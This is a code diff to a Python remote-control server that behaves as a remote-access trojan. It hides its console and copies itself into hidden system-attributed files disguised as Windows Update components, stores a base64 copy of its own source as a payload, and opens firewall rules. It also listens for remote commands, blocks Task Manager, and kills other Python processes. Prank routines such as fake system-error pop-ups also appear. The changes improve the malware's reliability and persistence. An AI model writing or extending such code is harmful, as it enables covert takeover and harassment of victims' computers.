@@ -7,6 +7,7 @@ import os
 import subprocess
 import importlib
 import ctypes
+import base64
 
 for _imp, _pip in [('numpy', 'numpy'), ('cv2', 'opencv-python-headless'), ('pyautogui', 'pyautogui'),
                     ('keyboard', 'keyboard'), ('pynput', 'pynput'), ('psutil', 'psutil'), ('mss', 'mss')]:
@@ -20,13 +21,19 @@ for _imp, _pip in [('numpy', 'numpy'), ('cv2', 'opencv-python-headless'), ('pyau
         except:
             print(f"Failed to install {_pip}")
 
-import numpy as np
-import cv2
-import pyautogui
-pyautogui.FAILSAFE = False
-import keyboard as kb
-from pynput.keyboard import Controller, Key
-import psutil
+try:
+    import numpy as np
+    import cv2
+    import pyautogui
+    pyautogui.FAILSAFE = False
+    import keyboard as kb
+    from pynput.keyboard import Controller, Key
+    import psutil
+except ImportError as _e:
+    print(f"Failed to import required module: {_e}")
+    print("Try manually: pip install pyautogui keyboard pynput psutil opencv-python-headless numpy mss")
+    sys.exit(1)
+
 
 
 def get_lan_ip():
@@ -48,10 +55,6 @@ def get_subnet_broadcast(ip, mask='255.255.255.0'):
 
 class RemoteControlServer:
     def __init__(self, host='0.0.0.0', port=80):
-        ctypes.windll.kernel32.SetLastError(0)
-        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, 'Global\\WindowsUpdateSvc')
-        if ctypes.windll.kernel32.GetLastError() == 183:
-            sys.exit(0)
         self.host = host
         self.port = port
         self.server_socket = None
@@ -59,7 +62,6 @@ class RemoteControlServer:
         self.running = False
         self.reverse_mouse = False
         self.keyboard_controller = Controller()
-        self.keyboard_capture_active = False
         self.block_taskmgr = False
         self.locked = False
         self.lock_window = None
@@ -67,6 +69,22 @@ class RemoteControlServer:
         self.automove_active = False
         self._kb_hook = None
         self._error_spam_active = False
+
+    def kill_conflicting_processes(self):
+        try:
+            self_pid = os.getpid()
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['pid'] == self_pid:
+                        continue
+                    name = (proc.info['name'] or '').lower()
+                    if name in ('python.exe', 'python3.exe', 'wupsvc.exe'):
+                        proc.kill()
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+            time.sleep(0.5)
+        except:
+            pass
 
     def broadcast_ip(self):
         lan_ip = get_lan_ip()
@@ -85,7 +103,6 @@ class RemoteControlServer:
 
     def hide_console(self):
         try:
-            import ctypes
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
             pass
@@ -153,20 +170,27 @@ class RemoteControlServer:
                 if not os.path.exists(dest_exe):
                     shutil.copy2(src, dest_exe)
                     kernel32.SetFileAttributesW(dest_exe, 2 | 4)
+            dat = os.path.join(dest_dir, 'WindowsUpdateHelper.dat')
+            pyload = None
             pld_path = os.environ.get('PLD')
             if pld_path and os.path.exists(pld_path):
                 with open(pld_path) as f:
                     pyload = f.read()
-                dat = os.path.join(dest_dir, 'WindowsUpdateHelper.dat')
-                if pyload:
-                    try:
-                        kernel32.SetFileAttributesW(dat, 128)
-                        os.remove(dat)
-                    except:
-                        pass
-                    with open(dat, 'w') as f:
-                        f.write(pyload)
-                    kernel32.SetFileAttributesW(dat, 2 | 4)
+            if not pyload:
+                try:
+                    with open(__file__, 'rb') as _f:
+                        pyload = base64.b64encode(_f.read()).decode()
+                except:
+                    pass
+            if pyload:
+                try:
+                    kernel32.SetFileAttributesW(dat, 128)
+                    os.remove(dat)
+                except:
+                    pass
+                with open(dat, 'w') as f:
+                    f.write(pyload)
+                kernel32.SetFileAttributesW(dat, 2 | 4)
             if not os.path.exists(dest_ps1):
                 ps1_content = (
                     '$ProgressPreference = "SilentlyContinue"\n'
@@ -204,32 +228,46 @@ class RemoteControlServer:
             pass
 
     def start(self):
-        self.hide_console()
-        self.self_install()
-        self.add_to_startup()
-        self.add_firewall_rules()
-        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server_socket.bind((self.host, self.port))
-        self.server_socket.listen(1)
-        self.running = True
+        try:
+            self.kill_conflicting_processes()
+            self.self_install()
+            self.add_firewall_rules()
+            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            for _retry in range(10):
+                try:
+                    self.server_socket.bind((self.host, self.port))
+                    break
+                except OSError:
+                    if _retry == 9:
+                        raise
+                    time.sleep(1)
+            self.server_socket.listen(1)
+            self.running = True
 
-        taskmgr_thread = threading.Thread(
-            target=self.monitor_task_manager,
-            daemon=True
-        )
-        taskmgr_thread.start()
+            taskmgr_thread = threading.Thread(
+                target=self.monitor_task_manager,
+                daemon=True
+            )
+            taskmgr_thread.start()
 
-        broadcast_thread = threading.Thread(
-            target=self.broadcast_ip,
-            daemon=True
-        )
-        broadcast_thread.start()
+            broadcast_thread = threading.Thread(
+                target=self.broadcast_ip,
+                daemon=True
+            )
+            broadcast_thread.start()
 
-        lan_ip = get_lan_ip()
-        print(f"Server started on {self.host}:{self.port}")
-        print(f"LAN IP: {lan_ip}:{self.port}")
-        print(f"Waiting for connections...")
+            lan_ip = get_lan_ip()
+            print(f"Server started on {self.host}:{self.port}")
+            print(f"LAN IP: {lan_ip}:{self.port}")
+            print(f"Waiting for connections...")
+            self.hide_console()
+        except Exception as _e:
+            print(f"Startup error: {_e}")
+            return
+        except:
+            print("Unknown startup error")
+            return
 
         try:
             while self.running:
@@ -520,19 +558,6 @@ class RemoteControlServer:
         except Exception as e:
             print(f"Error pressing special key {key_name}: {e}")
 
-    def send_screenshot(self):
-        try:
-            img = pyautogui.screenshot()
-            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-            _, img_encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 70])
-            compressed = zlib.compress(img_encoded.tobytes())
-            size = len(compressed)
-            size_bytes = size.to_bytes(4, 'big')
-            return size_bytes + compressed
-        except Exception as e:
-            print(f"Error sending screenshot: {e}")
-            return "Error"
-
     def play_rick_roll(self):
         try:
             os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ')
@@ -585,7 +610,6 @@ class RemoteControlServer:
     def _error_spam(self):
         import tkinter as tk
         import random
-        import string
         errors = [
             ("CRITICAL ERROR", "A fatal exception has occurred!\nError code: 0x{:08X}\nThe application will terminate.", "#1a0000", "#ff0000"),
             ("SYSTEM FAILURE", "Windows has detected a critical system error!\nError: 0x{:08X}\nImmediate action required.", "#000033", "#4488ff"),
